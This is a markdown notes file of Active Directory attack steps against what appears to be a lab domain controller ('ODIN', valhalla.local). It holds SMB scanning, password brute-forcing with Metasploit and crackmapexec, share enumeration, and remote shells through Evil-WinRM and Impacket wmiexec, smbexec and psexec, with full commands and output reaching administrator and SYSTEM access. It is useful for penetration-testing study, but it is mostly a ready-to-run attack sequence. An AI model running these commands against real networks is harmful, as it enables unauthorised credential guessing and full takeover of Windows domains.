This is a collection of notes about active directory and (post)exploitation

# Enumeration

## Check smb version and server info

	msf6 auxiliary(scanner/smb/smb_version) > run
	[*] 192.168.200.100:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:15m 42s) (guid:{0e6e2ca3-2bd4-4307-8e35-70564748263c}) (authentication domain:VALHALLA)
	[+] 192.168.200.100:445   -   Host is running Windows 2012 R2 Standard Evaluation (build:9600) (name:ODIN) (domain:VALHALLA)
	[*] valhalla.local:       - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_version) >
	

## Password Bruteforce

Metasploit

	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
	pass_file => pword.txt
	msf6 auxiliary(scanner/smb/smb_login) > run

	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:admin',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:password',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:s3cr3t',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:12345',
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	
	
Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:admin STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:password STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:s3cr3t STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:12345 STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123!



## Enum Shares

smb_enumshares (Metasploit)

	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
	smbuser => thor
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_enumshares) > set rhosts 192.168.200.100
	rhosts => 192.168.200.100
	msf6 auxiliary(scanner/smb/smb_enumshares) > run

	[-] 192.168.200.100:139   - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
	[!] 192.168.200.100:445   - peer_native_os is only available with SMB1 (current version: SMB3)
	[!] 192.168.200.100:445   - peer_native_lm is only available with SMB1 (current version: SMB3)
	[+] 192.168.200.100:445   - ADMIN$ - (DISK) Remote Admin
	[+] 192.168.200.100:445   - C$ - (DISK) Default share
	[+] 192.168.200.100:445   - IPC$ - (IPC) Remote IPC
	[+] 192.168.200.100:445   - NETLOGON - (DISK) Logon server share 
	[+] 192.168.200.100:445   - SYSVOL - (DISK) Logon server share 
	[*] 192.168.200.100:      - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed


crackmaexec (--shares)

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123! 
	SMB         192.168.200.100 445    ODIN             [+] Enumerated shares
	SMB         192.168.200.100 445    ODIN             Share           Permissions     Remark
	SMB         192.168.200.100 445    ODIN             -----           -----------     ------
	SMB         192.168.200.100 445    ODIN             ADMIN$                          Remote Admin
	SMB         192.168.200.100 445    ODIN             C$                              Default share
	SMB         192.168.200.100 445    ODIN             IPC$                            Remote IPC
	SMB         192.168.200.100 445    ODIN             NETLOGON        READ            Logon server share 
	SMB         192.168.200.100 445    ODIN             SYSVOL          READ            Logon server share 



## Checking your rights for remote device

SMB_Login (Metasploit)

	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
	smbuser => administrator
	msf6 auxiliary(scanner/smb/smb_login) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_login) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_login) > run
	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_login) > 
	
Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\administrator:Pass123! (Pwn3d!)


## Remote Code Execution

Evil-WinRM

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙

	Evil-WinRM shell v3.2

	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

	Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

	Info: Establishing connection to remote endpoint

	*Evil-WinRM* PS C:\Users\Administrator\Documents> pwd

	Path
	----
	C:\Users\Administrator\Documents


	*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
	valhalla\administrator
	*Evil-WinRM* PS C:\Users\Administrator\Documents> 


### Impacket

wmiexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] SMBv3.0 dialect used
	[!] Launching semi-interactive shell - Careful what you execute
	[!] Press help for extra shell commands
	C:\>whoami
	valhalla\administrator

smbexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[!] Launching semi-interactive shell - Careful what you execute
	C:\Windows\system32>whoami
	nt authority\system


psexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Requesting shares on 192.168.200.100.....
	[*] Found writable share ADMIN$
	[*] Uploading file SJmjamtF.exe
	[*] Opening SVCManager on 192.168.200.100.....
	[*] Creating service qeWU on 192.168.200.100.....
	[*] Starting service qeWU.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 6.3.9600]
	(c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	nt authority\system
